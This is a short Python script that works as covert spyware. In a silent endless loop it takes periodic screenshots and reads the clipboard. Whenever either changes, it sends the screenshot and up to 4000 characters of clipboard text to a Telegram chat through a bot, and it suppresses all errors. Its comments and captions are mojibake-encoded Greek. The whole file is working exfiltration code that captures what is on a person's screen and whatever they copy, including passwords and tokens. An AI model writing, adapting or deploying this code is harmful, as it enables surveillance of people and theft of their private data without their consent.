# -*- coding: utf-8 -*-
import time
import os
import pyautogui
import hashlib
import telebot
import pyperclip
from PIL import Image
from io import BytesIO

TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

INTERVAL = 1800  # 30 ÃƒÅ½Ã‚Â»ÃƒÅ½Ã‚ÂµÃƒÂÃ¢â€šÂ¬ÃƒÂÃ¢â‚¬Å¾ÃƒÅ½Ã‚Â¬
LAST_IMG_HASH = None
LAST_CLIP_HASH = None
bot = telebot.TeleBot(TOKEN)

def get_screen_hash():
    img = pyautogui.screenshot()
    buf = BytesIO()
    img.save(buf, format='PNG')
    return hashlib.md5(buf.getvalue()).hexdigest(), buf.getvalue()

def get_clipboard_hash():
    try:
        text = pyperclip.paste()
        return hashlib.md5(text.encode('utf-8')).hexdigest(), text
    except:
        return None, None

def send_screenshot(img_bytes):
    bot.send_photo(CHAT_ID, img_bytes, caption="ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¸ ÃƒÅ½Ã‚ÂÃƒÅ½Ã‚Â­ÃƒÅ½Ã‚Â¿ screenshot ÃƒÅ½Ã‚ÂµÃƒÅ½Ã‚Â½ÃƒÂÃ¢â‚¬Å¾ÃƒÅ½Ã‚Â¿ÃƒÂÃ¢â€šÂ¬ÃƒÅ½Ã‚Â¯ÃƒÂÃ†â€™ÃƒÂÃ¢â‚¬Å¾ÃƒÅ½Ã‚Â·ÃƒÅ½Ã‚ÂºÃƒÅ½Ã‚Âµ")

def send_clipboard(text):
    bot.send_message(CHAT_ID, f"ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã¢â‚¬Â¹ ÃƒÅ½Ã‚ÂÃƒÅ½Ã‚Â­ÃƒÅ½Ã‚Â¿ Clipboard:\n{text[:4000]}")

while True:
    try:
        new_img_hash, img_bytes = get_screen_hash()
        new_clip_hash, clip_text = get_clipboard_hash()

       

        if LAST_IMG_HASH != new_img_hash:
            send_screenshot(BytesIO(img_bytes))
            LAST_IMG_HASH = new_img_hash

        if clip_text and LAST_CLIP_HASH != new_clip_hash:
            send_clipboard(clip_text)
            LAST_CLIP_HASH = new_clip_hash

    except Exception as e:
        pass

    time.sleep(INTERVAL)





